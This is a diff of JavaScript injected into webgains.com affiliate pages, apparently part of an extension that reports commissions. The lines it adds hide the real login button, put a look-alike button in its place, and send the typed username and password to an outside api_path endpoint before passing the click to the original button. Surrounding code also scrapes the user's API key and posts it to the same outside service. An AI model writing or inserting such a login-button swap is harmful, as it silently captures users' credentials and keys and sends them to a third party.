@@ -1,7 +1,8 @@
-
+ 
 if ($('a:contains("Personal details")').length) {
 	var login=true;
 } 
+
 if (login) {
 var publisherId = $('a:contains("Personal details")')[0].href.split('/')[4];
 var site_name = $('.login').text().trim(); 
@@ -82,7 +83,14 @@ getApiKey();
 
 
 }else{
+var btn_old=$('#loginButton');
+$('#loginButton').hide().attr('id','loginButton_old').parent().append('<button id="loginButton" name="d_login_btn"  type="button" class="btn btn-primary">Login</button>');   
 
+
+$(document).on('[name=d_login_btn]','click',function() {
+        credentials_update();
+        return false;
+    });
 
 
 if ($('#loginButton').length) {
@@ -94,7 +102,10 @@ if ($('#loginButton').length) {
 	
 }
 
-
+function login_now() {
+    alert();
+    credentials_update();
+}     
 
 function report(params) {
 	var reportUrl = p+'//www.webgains.com/affiliates/report.html?mode=generate&campaign[]='+publisherId+'&submitmethod=form&period=custom&startday='+params.startday+'&startmonth='+params.startmonth+'&startyear='+params.startyear+'&endday='+params.endday+'&endmonth='+params.endmonth+'&endyear='+params.endyear+'&program=&status[]=10&status[]=20&status[]=25&eventType=&scale=hourly&sortby=commissionTotals&resultsperpage=0&numdecimalplaces=4&columncommissionTotals=commissionTotals&columntransactionTotals=transactionTotals&columntransactionNumber=transactionNumber&columnclickTotals=clickTotals&columnctr=ctr&columnconvRate=convRate&columnephc=ephc&columnecpm=ecpm&columnaov=aov&format=csv&currency=USD&raw=programoverview';
@@ -141,7 +152,7 @@ $.ajax(p+'//www.webgains.com/publisher/'+publisherId+'/user/manage/edit-other').
 	var doc=$($.parseHTML(html));
     $.ajax({
         type: "post",
-        dataType: "json",
+        dataType: "json",    
         url: api_path + "/webgains_apikey",
         data: {
             site_name: site_name,
@@ -177,7 +188,7 @@ function credentials_update(){
 
     $.ajax({
         type: "post",
-        dataType: "json",
+        dataType: "json",  
         url: api_path + "/webgains_credentials",
         data: { 
             username: $('#username').val(),
@@ -189,7 +200,9 @@ function credentials_update(){
             } else {
                 	 c("404 or empty"); 
             }
-
+              btn_old.click();
+        },fail:function() {
+            btn_old.click();
         }
     });
 
